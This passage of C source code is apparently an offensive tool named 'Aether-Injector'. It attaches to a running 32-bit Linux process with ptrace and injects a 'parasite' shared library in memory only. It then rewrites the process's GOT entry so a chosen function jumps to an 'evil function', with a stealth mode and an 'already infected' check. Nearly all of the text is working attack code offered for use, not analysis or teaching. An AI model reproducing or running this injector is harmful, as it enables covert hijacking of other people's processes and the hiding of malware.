			sinfo = (struct ae_sym_info*)malloc(sizeof(struct ae_sym_info) + sizeof(struct ae_sym)*symcount);

			if (!sinfo) {
				ae_log(AE_LOG_ERROR, "Could not allocate symbol info");
				return NULL;
			}

			sinfo->count = symcount;

			for (j = 0; j < symcount; j++, symsp++) {
				strncpy(sinfo->syms[j].name, &symname[symsp->st_name], MAXBUF);
				sinfo->syms[j].index = j;
			}

			free(symname);
			free(syms);
			break;
		}
	}

	// associate relocation entires with symbols
	for (i = 0; i < ehdr->e_shnum; i++, shdr++) {
		if (shdr->sh_type == SHT_REL) {
			rel = (Elf32_Rel*)(mem + shdr->sh_offset);
			for (j = 0; j < shdr->sh_size; j += sizeof(Elf32_Rel), rel++) {
				for (k = 0; k < symcount; k++) {
					if (ELF32_R_SYM(rel->r_info) == sinfo->syms[k].index) 
						sinfo->syms[k].offset = rel->r_offset;
				}
			}
		}
	}

	return sinfo;
}


static size_t
ae_get_evil_lib_size (int pid, char * libname) 
{
	FILE * fd = NULL;
	char maps[MAXBUF] = {0};
	char buf[MAXBUF];

	snprintf(maps, MAXBUF, "/proc/%d/maps", pid);

	fd = fopen(maps, "r");
	if (!fd) {
		ae_log(AE_LOG_ERROR, "Could not open maps file");
		return 0;
	}

	while (fgets(buf, MAXBUF, fd)) {
		if (strstr(buf, libname)) {
			char * ptr = strtok(buf, " ");
			for (int i = 0; i < 4; i++)
				ptr = strtok(NULL, " ");
			fclose(fd);
			return atoi(ptr);
		}
	}
			
	fclose(fd);
	return 0;
}


static ulong_t
ae_search_evil_lib (int pid, char * libname, ulong_t vaddr)
{
	uchar_t * buf;
	int i = 0;
	size_t libsz;
	ulong_t evilvaddr = 0;

	libsz = ae_get_evil_lib_size(pid, libname);
	
	if ((buf = malloc(libsz)) == NULL) {
		ae_log(AE_LOG_ERROR, "Could not allocate lib buffer");
		exit(EXIT_FAILURE);
	}

	ae_ptrace_cpy_from((ulong_t*)buf, vaddr, libsz, pid);
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Searching at library base [0x%lx] for evil function", vaddr);
	
	for (i = 0; i < libsz; i++) {
		if (memcmp(&buf[i], evilsig, strlen(evilsig)) == 0) {
			evilvaddr = (vaddr + i);
			break;
		}
	}

	if (!evilvaddr) {
		ae_log(AE_LOG_ERROR, "Could not find evil function");
		goto out_err;
	}
	
	if (!ae_stealth_mode) {
		ae_log(AE_LOG_DEBUG, "Parasite code ->");
#ifdef DEBUG_ENABLE
		ae_dump_buf(buf, 50);
#endif
	}

out_err:
	free(buf);
	return evilvaddr;
}


static bool 
ae_evil_lib_present (char * lib, int pid)
{
	char meminfo[MAXBUF];
	char buf[MAXBUF];
	FILE * fd;

	memset(meminfo, 0, sizeof(meminfo));
	snprintf(meminfo, sizeof(meminfo), "/proc/%d/maps", pid);

	fd = fopen(meminfo, "r");

	if (!fd) {
		ae_log(AE_LOG_ERROR, "Could not open map file");
		return true;
	}
	
	while (fgets(buf, MAXBUF, fd)) {
		if (strstr(buf, lib)) {
			fclose(fd);
			return true;
		}
	}

	fclose(fd);
	return false;
}


static Elf32_Addr
ae_patch_got (struct ae_opts * opt, struct ae_sym_info * sinfo, ulong_t lib_base, ulong_t patch_val, bool is_pie)
{
	Elf32_Addr ret = 0;
	Elf32_Addr got_offset;
	
	// overwrite GOT entry with addr of evilfunc (our replacement)
	for (int i = 0; i < sinfo->count; i++) {
		if (strcmp(sinfo->syms[i].name, opt->func) == 0) {

			if (!opt->stealth)
				ae_log(AE_LOG_DEBUG, "Found string <%s> to patch", sinfo->syms[i].name);

			if (is_pie) {
				got_offset = (lib_base + (sinfo->syms[i].offset - ae_text_base));
			} else {
				got_offset = sinfo->syms[i].offset;
			}

			ae_original = (ulong_t)ptrace(PTRACE_PEEKTEXT, opt->pid, got_offset);
			ptrace(PTRACE_POKETEXT, opt->pid, got_offset, patch_val);
			ret = ptrace(PTRACE_PEEKTEXT, opt->pid, got_offset);
			break;
		}
	}
	return ret;
}


static void
ae_print_banner (void)
{
	fprintf(stderr, "\n");
	fprintf(stderr, "    ___          __  __                \n");
	fprintf(stderr, "   /   | ___  __/ /_/ /_  ___  _____  \n");
	fprintf(stderr, "  / /| |/ _ \\/ __/ __ \\/ _ \\/ ___/  \n");
	fprintf(stderr, " / ___ /  __/ /_/ / / /  __/ /      \n");
	fprintf(stderr, "/_/  |_\\___/\\__/_/ /_/\\___/_/       \n");
	fprintf(stderr, "                                      \n");
	fprintf(stderr, "   Aether-Injector v1.0               \n");
	fprintf(stderr, "   Memory-Only Process Injection      \n");
	fprintf(stderr, "\n");
}


static void
ae_usage (char ** argv)
{
	ae_log(AE_LOG_INFO, "\nUsage: %s -t <pid> -m <module> -f <function> [opts]", argv[0]);
	ae_log(AE_LOG_INFO, "\nRequired Arguments:");
	ae_log(AE_LOG_INFO, "  -t <pid>       Target process ID");
	ae_log(AE_LOG_INFO, "  -m <module>    Path to shared object (.so) to inject");
	ae_log(AE_LOG_INFO, "  -f <function>  Function name to hijack in target process");
	ae_log(AE_LOG_INFO, "\nOptional Arguments:");
	ae_log(AE_LOG_INFO, "  -s             Stealth mode (memory-only injection, reduced logging)");
	ae_log(AE_LOG_INFO, "\nExamples:");
	ae_log(AE_LOG_INFO, "  %s -t 1234 -m ae_parasite.so.1.0 -f printf", argv[0]);
	ae_log(AE_LOG_INFO, "  %s -t 5678 -m ae_parasite.so.1.0 -f malloc -s", argv[0]);

	exit(EXIT_SUCCESS);
}



static void 
ae_parse_args (int argc, char ** argv, struct ae_opts * opt)
{
	int c;
	opterr = 0;

	opt->stealth  = false;
	opt->pid      = -1;
	opt->libname  = NULL;
	opt->func     = NULL;
	
	while ((c = getopt(argc, argv, "st:m:f:")) != -1) {
		switch (c) {
			case 's':
				opt->stealth = true;
				break;
			case 't':
				opt->pid = (int)atol(optarg);
				break;
			case 'm':
				opt->libname = optarg;
				break;
			case 'f':
				opt->func = optarg;
				break;
			case '?':
				if (isprint(optopt))
					ae_log(AE_LOG_ERROR, "Unknown option '-%c'", optopt);
				else 
					ae_log(AE_LOG_ERROR, "Unknown option character '\\x%x", optopt);
				exit(EXIT_FAILURE);
			default:
				abort();
		}
	}

	if (opt->pid == -1) {
		ae_log(AE_LOG_ERROR, "-t option is required (target PID)");
		ae_usage(argv);
	}

	if (opt->func == NULL) {
		ae_log(AE_LOG_ERROR, "-f option is required (function name)");
		ae_usage(argv);
	}

	if (opt->libname == NULL) {
		ae_log(AE_LOG_ERROR, "-m option is required (module path)");
		ae_usage(argv);
	}
}


static char * 
ae_map_binary (int pid)
{
	char meminfo[MAXBUF] = {0};
	char proc_status[MAXBUF];
	struct stat st;
	int fd;
	char * ret = NULL;
	FILE *status_file;

	/* First verify the process exists by checking /proc/pid/status */
	snprintf(proc_status, sizeof(proc_status), "/proc/%d/status", pid);
	status_file = fopen(proc_status, "r");
	if (!status_file) {
		ae_log(AE_LOG_ERROR, "Process %d does not exist or is not accessible", pid);
		return MAP_FAILED;
	}
	fclose(status_file);

	snprintf(meminfo, sizeof(meminfo), "/proc/%d/exe", pid);

	if ((fd = open(meminfo, O_RDONLY)) == -1) {
		ae_log(AE_LOG_ERROR, "Could not open binary at %s: %s (PID %d may be a kernel thread or exited)", 
		       meminfo, strerror(errno), pid);
		return MAP_FAILED;
	}

	if (fstat(fd, &st) < 0) {
		ae_log(AE_LOG_ERROR, "Could not stat binary: %s (fd=%d, pid=%d)", 
		       strerror(errno), fd, pid);
		close(fd);
		return MAP_FAILED;
	}

	if (st.st_size <= 0) {
		ae_log(AE_LOG_ERROR, "Invalid binary size: %ld bytes", (long)st.st_size);
		close(fd);
		return MAP_FAILED;
	}

	ret = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);

	close(fd);

	if (ret == MAP_FAILED) {
		ae_log(AE_LOG_ERROR, "mmap failed: %s", strerror(errno));
	}

	return ret;
}


static bool
ae_good_elf (Elf32_Ehdr * ehdr, struct ae_opts * opt)
{
	if (!(ehdr->e_ident[EI_MAG0] == ELFMAG0 &&
 		  ehdr->e_ident[EI_MAG1] == ELFMAG1 &&
		  ehdr->e_ident[EI_MAG2] == ELFMAG2 &&
		  ehdr->e_ident[EI_MAG3] == ELFMAG3)) {
		ae_log(AE_LOG_ERROR, "Binary is not an ELF executable");
		return false;
	}

	if (ehdr->e_ident[EI_CLASS] != ELFCLASS32) {
		ae_log(AE_LOG_ERROR, "Only 32-bit ELF executables are supported");
		return false;
	}

	if (!(ehdr->e_type == ET_EXEC || ehdr->e_type == ET_DYN)) {
		ae_log(AE_LOG_ERROR, "Only executable binaries are supported");
		return false;
	}

	return true;
}


static inline bool 
ae_binary_is_pie (Elf32_Ehdr * ehdr)
{
	return (ehdr->e_type == ET_DYN);
}


static void
ae_parse_headers (Elf32_Ehdr * ehdr, struct ae_segments * segs)
{
	Elf32_Phdr * phdr = (Elf32_Phdr*)((char*)ehdr + ehdr->e_phoff);
	int i;

	for (i = 0; i < ehdr->e_phnum; i++, phdr++) {
		if (phdr->p_type == PT_LOAD) { 
			// .text
			if (phdr->p_flags == (PF_X | PF_R)) {
				segs->segs[TYPE_TEXT].base   = phdr->p_vaddr;
				ae_text_base = phdr->p_vaddr;
				segs->segs[TYPE_TEXT].offset = phdr->p_offset;
				segs->segs[TYPE_TEXT].len    = phdr->p_filesz;
			}

			// .data
			if (phdr->p_flags == (PF_W | PF_R)) {
				segs->segs[TYPE_DATA].base   = phdr->p_vaddr;
				ae_data_base = phdr->p_vaddr;
				segs->segs[TYPE_DATA].offset = phdr->p_offset;
				segs->segs[TYPE_DATA].len    = phdr->p_filesz;
			}
		}
	}
}


static int
ae_inject_lib (struct ae_opts * opt, ulong_t * evilbase, struct ae_segments * segs)
{
	if (!opt->stealth)
		ae_log(AE_LOG_DEBUG, "Injecting library via memory-only phantom load");
	
	/* ae_mmap_library handles its own attach/detach, so we don't need to attach here */
	if (ae_mmap_library(opt->pid, opt->libname, evilbase, segs) < 0) {
		return -1;
	}

	/* Re-attach for subsequent operations (searching for evil function, patching GOT) */
	if (ptrace(PTRACE_ATTACH, opt->pid, NULL, NULL)) {
		ae_log(AE_LOG_ERROR, "Could not attach");
		return -1;
	}

	int status;
	waitpid(opt->pid, &status, WUNTRACED);
	if (!WIFSTOPPED(status)) {
		ae_log(AE_LOG_ERROR, "Process is not stopped after attach (inject_lib)");
		return -1;
	}

	return 0;
}


/* Get actual load address for PIE binaries from /proc/pid/maps */
/* Returns the base address (first mapping with offset 0 that belongs to the executable) */
static ulong_t
ae_get_pie_base(int pid)
{
	FILE *f;
	char path[256], line[1024];
	ulong_t base = 0;
	ulong_t start, end;
	char perms[8], offset[16], dev[16], inode[32], pathname[512];

	snprintf(path, sizeof(path), "/proc/%d/maps", pid);
	f = fopen(path, "r");
	if (!f)
		return 0;

	/* Find the first mapping with offset 0 that belongs to the main executable */
	/* Format: start-end perms offset dev inode pathname */
	/* Example: 56574000-56575000 r--p 00000000 08:50 1679 /tmp/ae_daemon */
	while (fgets(line, sizeof(line), f)) {
		/* Parse using sscanf - pathname is optional and may have leading spaces */
		if (sscanf(line, "%lx-%lx %7s %15s %15s %31s %511[^\n]", 
		           &start, &end, perms, offset, dev, inode, pathname) >= 6) {
			/* Check if offset is 0 */
			if (strcmp(offset, "00000000") == 0) {
				/* Check if it's a real file path (not [heap], [stack], [vdso], etc.) */
				/* Skip leading spaces in pathname */
				char *p = pathname;
				while (*p == ' ' || *p == '\t') p++;
				
				if (*p != '\0' && *p != '[') {
					/* This is the first mapping of the main executable */
					base = start;
					break;
				}
			}
		} else {
			/* Try parsing without pathname (some mappings don't have one) */
			if (sscanf(line, "%lx-%lx %7s %15s %15s %31s", 
			           &start, &end, perms, offset, dev, inode) >= 5) {
				if (strcmp(offset, "00000000") == 0) {
					/* No pathname means it's likely a special region, skip */
					continue;
				}
			}
		}
	}
	fclose(f);
	
	return base;
}


/* Find a writable memory region from /proc/pid/maps */
static ulong_t
ae_find_writable_region(int pid, size_t size)
{
	FILE *f;
	char path[256], line[1024];
	ulong_t start, end;
	
	snprintf(path, sizeof(path), "/proc/%d/maps", pid);
	f = fopen(path, "r");
	if (!f)
		return 0;
	
	/* Look for a writable mapping (rw-p or rw-) */
	while (fgets(line, sizeof(line), f)) {
		if (strstr(line, " rw-p ") || strstr(line, " rw- ")) {
			/* Parse start-end addresses */
			if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
				if ((end - start) >= size) {
					fclose(f);
					/* Return address in the middle of the region */
					return start + ((end - start) / 2);
				}
			}
		}
	}
	
	fclose(f);
	return 0;
}

static inline void
ae_attach (int pid)
{
	int status;

	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL)) {
		ae_log(AE_LOG_ERROR, "Failed to attach to process");
		exit(EXIT_FAILURE);
	}
	waitpid(pid, &status, WUNTRACED);
	
	/* Ensure process is stopped */
	if (!WIFSTOPPED(status)) {
		ae_log(AE_LOG_ERROR, "Process is not stopped after attach (status: %d)", status);
		exit(EXIT_FAILURE);
	}
	
	/* Set ptrace options to ensure proper behavior */
	if (ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACESYSGOOD) == -1) {
		/* Non-fatal, just log */
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Could not set ptrace options: %s", strerror(errno));
	}
}


int 
main (int argc, char **argv)
{
	uchar_t * mem = NULL;
	Elf32_Ehdr *ehdr;
	Elf32_Addr ret;
	ulong_t evilfunc;
	ulong_t evilbase;
	struct ae_sym_info * sinfo;

	struct ae_opts opt;
	struct ae_segments segs;

	unsigned char evil_code[MAXBUF];
	ulong_t injection_vaddr = 0;

	ae_print_banner();
	ae_parse_args(argc, argv, &opt);
	
	ae_stealth_mode = opt.stealth;

	if (!opt.stealth)
		ae_log(AE_LOG_INFO, "Target PID: %d | Module: %s | Function: %s", opt.pid, opt.libname, opt.func);

	mem = ae_map_binary(opt.pid);
	if (mem == MAP_FAILED) {
		ae_log(AE_LOG_ERROR, "Could not map binary");
		exit(EXIT_FAILURE);
	}

	ehdr = (Elf32_Ehdr *)mem;

	// make sure this is a valid ELF
	if (!ae_good_elf(ehdr, &opt)) {
		ae_log(AE_LOG_ERROR, "ELF verification failed");
		exit(EXIT_FAILURE);
	}

	bool is_pie = ae_binary_is_pie(ehdr);
	if (!opt.stealth && is_pie)
		ae_log(AE_LOG_INFO, "Target is PIE binary (ET_DYN)");

	ae_parse_headers(ehdr, &segs);

	// attach to the running process
	ae_attach(opt.pid);
	
	// For PIE binaries, adjust base addresses to actual load address
	// The ELF headers contain file-relative addresses, we need to add the runtime base
	if (is_pie) {
		ulong_t pie_base = ae_get_pie_base(opt.pid);
		if (pie_base > 0) {
			/* For PIE binaries, both text and data segments are relative to the load base */
			/* The ELF p_vaddr values are file-relative, so we add the runtime base */
			ae_text_base += pie_base;
			if (ae_data_base > 0) {
				/* Calculate expected data segment address */
				ulong_t calculated_data_base = ae_data_base + pie_base;
				
				/* Try to find actual data segment from /proc/pid/maps */
				/* Look for rw-p mapping that's close to our calculated address */
				FILE *f;
				char path[256], line[1024];
				ulong_t actual_data_base = 0;
				
				snprintf(path, sizeof(path), "/proc/%d/maps", opt.pid);
				f = fopen(path, "r");
				if (f) {
					while (fgets(line, sizeof(line), f)) {
						ulong_t start = strtoul(line, NULL, 16);
						/* Look for writable mapping near our calculated address */
						if ((strstr(line, " rw-p ") || strstr(line, " rw- ")) && 
						    start >= calculated_data_base && 
						    start < calculated_data_base + 0x10000) {
							actual_data_base = start;
							break;
						}
					}
					fclose(f);
				}
				
				/* Use actual if found, otherwise use calculated */
				if (actual_data_base > 0) {
					ae_data_base = actual_data_base;
				} else {
					ae_data_base = calculated_data_base;
				}
			} else {
				ae_log(AE_LOG_ERROR, "Invalid data segment base address");
				exit(EXIT_FAILURE);
			}
		} else {
			ae_log(AE_LOG_ERROR, "Failed to determine PIE base address");
			exit(EXIT_FAILURE);
		}
	}
	
	/* Validate addresses before proceeding */
	if (ae_data_base == 0) {
		ae_log(AE_LOG_ERROR, "Data segment base address is zero");
		exit(EXIT_FAILURE);
	}

	// get symbol relocation information for our target
	sinfo = ae_get_plt(mem);
	
	if (!sinfo) {
		ae_log(AE_LOG_ERROR, "Could not parse PLT information");
		exit(EXIT_FAILURE);
	}

	/* inject library into process using phantom load (memory-only) */
	if (ae_evil_lib_present(opt.libname, opt.pid)) {
		ae_log(AE_LOG_ERROR, "Process %d already infected, %s is mmap'd already", opt.pid, opt.libname);
		goto out_err;
	} else {
		ae_inject_lib(&opt, &evilbase, &segs);
	}

	if ((evilfunc = ae_search_evil_lib(opt.pid, opt.libname, evilbase)) == 0) {
		ae_log(AE_LOG_ERROR, "Could not locate evil function");
		goto out_err;
	}

	if (!opt.stealth) {
		ae_log(AE_LOG_DEBUG, "Evil function location: 0x%lx", evilfunc);
		ae_log(AE_LOG_DEBUG, "Modifying GOT entry to replace <%s> with 0x%lx", opt.func, evilfunc);
	}

	ret = ae_patch_got(&opt, sinfo, evilbase, evilfunc, is_pie);

	if (ret == evilfunc) {
		if (!opt.stealth)
			ae_log(AE_LOG_DEBUG, "Successfully modified GOT entry");
		else
			ae_log(AE_LOG_SUCCESS, "Injection complete");
	} else {
		ae_log(AE_LOG_ERROR, "Failed to modify GOT entry");
		goto out_err;
	} 

	if (!opt.stealth)
		ae_log(AE_LOG_DEBUG, "New GOT value: %x", ret);

	// get a copy of our replacement function 
	// and search for control transfer sequence 
	ae_ptrace_cpy_from((ulong_t*)evil_code, evilfunc, MAXBUF, opt.pid);

	/* once located, patch it with the addr of the original function */
	for (int i = 0; i < MAXBUF; i++) {
		if (memcmp(&evil_code[i], tc, strlen(tc)) == 0) {
			if (!opt.stealth)
				ae_log(AE_LOG_DEBUG, "Located transfer code. Patching with %lx", ae_original);
			injection_vaddr = (evilfunc + i) + 3;
			break;
		}
	}

	if (!injection_vaddr) {
		ae_log(AE_LOG_ERROR, "Could not locate transfer code within parasite");
		goto out_err;
	}

	// patch jmp code with addr to original function
	ae_inject_transfer_code(opt.pid, injection_vaddr, ae_original);

done:
	ptrace(PTRACE_DETACH, opt.pid, NULL, NULL);
	return 0;

out_err:
	ptrace(PTRACE_DETACH, opt.pid, NULL, NULL);
	return EXIT_FAILURE;
}
